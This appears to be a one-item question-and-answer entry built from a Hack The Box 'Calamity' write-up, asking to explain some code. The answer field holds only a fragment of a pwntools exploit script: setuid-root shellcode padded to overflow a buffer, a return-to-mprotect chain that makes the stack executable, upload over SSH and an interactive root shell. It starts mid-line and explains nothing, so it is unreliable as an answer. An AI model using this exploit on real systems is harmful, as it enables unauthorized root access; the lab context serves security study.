@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Explain the purpose and usage of the code/command in the following text: (Context: Writeup from Htb Calamity Hacks Stuff)
+
+CONTEXT:
+Source: Htb Calamity Hacks Stuff
+Section: Writeup
+
+METHOD / ANSWER:
+f ' Stack address space: 0x { stack_start } - 0x { stack_end } ' ) ## Stage 3 - Shell mprotect = 0xb7efcd50 size = stack_end - stack_start shellcode = asm ( shellcraft . setuid ( 0 ) + shellcraft . execve ( ' /bin/sh ' )) payload = shellcode payload += b " A " * ( 76 - len ( shellcode )) payload += p32 ( mprotect ) payload += p32 ( buff_addr ) payload += p32 ( stack_start ) payload += p32 ( size ) payload += p32 ( 7 ) log . info ( f ' Writing Stage 3 exploit to { fn } ' ) sshConn . upload_data ( payload , fn ) goodluck . sendline ( fn ) log . info ( f ' Cleaning up { fn } ' ) sshConn . unlink ( fn ) goodluck . interactive ( prompt = '' )
